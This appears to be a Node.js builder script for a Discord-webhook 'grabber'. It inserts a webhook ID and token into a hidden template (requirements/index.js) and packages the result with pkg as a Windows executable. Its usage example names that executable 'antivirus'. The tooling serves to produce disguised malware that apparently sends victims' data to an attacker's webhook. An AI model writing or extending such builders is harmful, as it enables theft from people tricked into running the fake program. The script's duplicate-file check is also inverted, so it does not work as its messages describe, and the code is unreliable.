//Dependencies
const Simple_Exec = require("simple-exec")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

//Functions
async function Main(){
    const results = await Simple_Exec.executeSync("pkg -h")

    console.log("Checking for duplicate in dist.")
    if(!Fs.existsSync(`./dist/${Self_Args[1]}.exe`)){
        console.log("Found a duplicate in dist, please try again with another name or delete the duplicate in dist.")
        process.exit()
    }

    if(results.error){
        console.log("It looks like NPM package PLG is not installed, please install it.")
        process.exit()
    }

    if(results.output.indexOf("pkg [options] <input>") == -1){
        console.log("It looks like NPM package PLG is not installed, please install it.")
        process.exit()
    }

    console.log("Putting the discord webhook link.")
    var main_data = Fs.readFileSync("./requirements/index.js", "utf8")
    main_data = main_data.replace("wid", Self_Args[0].split("/")[Self_Args[0].split("/").length-2])
    main_data = main_data.replace("wtoken", Self_Args[0].split("/")[Self_Args[0].split("/").length-1])
    
    console.log("Cloning for temporary.")
    Fs.writeFileSync("./requirements/temp_index.js", main_data, "utf8")

    console.log("Building, please wait...")
    const build_results = await Simple_Exec.executeSync(`pkg requirements/temp_index.js -t ${Self_Args[2]} -o dist/${Self_Args[1]}.exe`)
    
    if(build_results.error){
        console.log("Something went wrong while building, please make sure the arguments are valid.")
        process.exit()
    }else{
        console.log("Successfully built.")
        console.log("Removing temporary file.")

        Fs.unlinkSync("./requirements/temp_index.js")

        console.log("Finished.")
        process.exit()
    }
}

//Main
if(!Self_Args.length){
    console.log(`node index.js <webhook_link> <output_name> <node_and_os>
Example: node index.js yourwebhooklink antivirus node14-win-x64`)
    process.exit()
}

if(!Self_Args[0]){
    console.log("Invalid webhook_link.")
    process.exit()
}

if(!Self_Args[1]){
    console.log("Invalid output_name.")
    process.exit()
}

if(!Self_Args[2]){
    console.log("Invalid node_and_os.")
    process.exit()
}

Main()
